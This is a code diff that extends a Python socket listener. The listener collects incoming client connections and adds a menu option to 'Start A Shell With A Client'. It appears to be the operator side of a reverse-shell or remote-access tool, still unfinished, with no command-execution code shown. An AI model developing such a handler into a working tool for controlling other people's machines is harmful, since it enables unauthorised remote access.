@@ -1,17 +1,25 @@
+#!/usr/bin/python3
 import socket
 import sys
 import threading
+import time
 
 client_list = []
+BUFFER_SIZE = 1024 * 128
+SEPARATOR = "<sep>"
 
 def clear():
     print("\033[H\033[J")
 
 def printMenu():
     print("[1] List Active Clients")
-    print("[2] Remove Connected Client\n")
+    print("[2] Remove Connected Client")
+    print("[3] Start A Shell With A Client\n")
+    print("[X] Exit\n")
+
 
 def startListener(HOST, PORT):
+
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((HOST, PORT))
     s.listen(5)
@@ -26,7 +34,7 @@ def startListener(HOST, PORT):
              client_list.append(conn)
         
 
-def activeClients(flag):
+def activeClients():
      counter = 0
 
      if len(client_list) < 1:
@@ -69,8 +77,6 @@ def removeClient():
             clear()
             return "\nError: Could Not Remove Client\n"
 
-
-
 def main(HOST, PORT):
     isRunning = True
     menu = True
@@ -99,14 +105,23 @@ Listening: {HOST} : {PORT}\n
         option = input("Select An Option: ")
 
         if option == "1":
-            str = activeClients(option)
+            str = activeClients()
             print(str)
         elif option == "2":
-            str = activeClients(option)
+            str = activeClients()
             print (str)
             str = removeClient()
             print(str)
             printMenu()
+        elif option == "3":
+            str = activeClients()
+            print(str)
+            selectedClientStr = input("To Start A Shell, Type In The Client Number: ")
+        elif option == "X":
+            isRunning = False
+            for client in client_list:
+                client.close()
+            print("Exiting\n")
         else:
             clear()
             print("Invalid Option\n")
